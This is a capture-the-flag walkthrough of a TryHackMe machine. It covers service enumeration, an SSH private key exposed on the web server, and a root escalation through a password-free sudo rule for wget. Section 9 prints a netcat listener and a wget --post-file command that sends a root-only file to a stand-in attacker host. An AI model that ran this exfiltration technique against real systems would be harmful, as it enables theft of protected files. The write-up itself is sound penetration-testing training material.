# TryHackMe — CorpOne Walkthrough (Write-Up)

## Overview

This report documents the full exploitation process of the **CorpOne** machine.
The objective was to enumerate exposed services, obtain SSH access through exposed credentials, capture the user flag, and escalate privileges to root.

---

# 1. Enumeration

Initial reconnaissance was performed using Nmap.

```bash
nmap -sC -sV <TARGET_IP>
```

### Result

The scan revealed two open ports:

- 22 — SSH
- 80 — HTTP (Apache Web Server)

The exposed web service became the primary attack surface.

---

# 2. Web Enumeration

Directory brute forcing was performed using:

```bash
dirsearch -u http://<TARGET_IP>
```

### Discovered Directories

```
/sitemap
/sitemap/.ssh
```

Manual browsing revealed that the web server exposed an **.ssh directory**, which should never be publicly accessible.

Inside the directory an SSH private key was discovered.

---

# 3. SSH Private Key Discovery

The RSA private key was downloaded from the web server.

Permissions were corrected locally:

```bash
chmod 600 key.pem
```

SSH private keys require restricted permissions before use.

---

# 4. Username Discovery

SSH authentication requires both:

- valid private key
- valid username

The username was identified through information visible on the Apache webpage.

Discovered user:

```
jessica
```

---

# 5. Initial Access — SSH Login

SSH access obtained using:

```bash
ssh -i key.pem jessica@<TARGET_IP>
```

Successful authentication granted a user shell.

---

# 6. User Flag

After login:

```bash
ls -la
```

The user flag was located at:

```
/home/jessica/Documents/user_flag.txt
```

Flag retrieved:

```bash
cat /home/jessica/Documents/user_flag.txt
```

User access confirmed.

---

# 7. Privilege Escalation Enumeration

Checking sudo permissions:

```bash
sudo -l
```

Result:

```
(root) NOPASSWD: /usr/bin/wget
```

User **jessica** could execute wget as root without entering a password.

---

# 8. Vulnerability Analysis

wget is normally a download utility.

However, it supports HTTP POST requests.

This allows a user to upload files from the local machine to a remote server.

Because sudo allows execution as root, files readable only by root can be exfiltrated.

---

# 9. Root Exploitation

A Netcat listener was started on the attacking machine:

```bash
nc -lvnp 9001
```

Root flag exfiltration performed:

```bash
sudo /usr/bin/wget --post-file=/root/root_flag.txt http://ATTACKER_IP:9001
```

The file contents were received directly on the attacker listener.

---

# 10. Root Flag

Root flag successfully captured.

Root privilege escalation completed.

---

# Lessons Learned

- Sensitive directories such as `.ssh` must never be publicly accessible.
- SSH private key exposure results in immediate compromise.
- sudo misconfigurations can allow privilege escalation without exploits.
- Allowed binaries can be abused for unintended functionality.

---

## Tools Used

- Nmap
- Dirsearch
- SSH
- Netcat
- Wget

---

## Author

Walkthrough prepared as part of cybersecurity training and penetration testing practice.
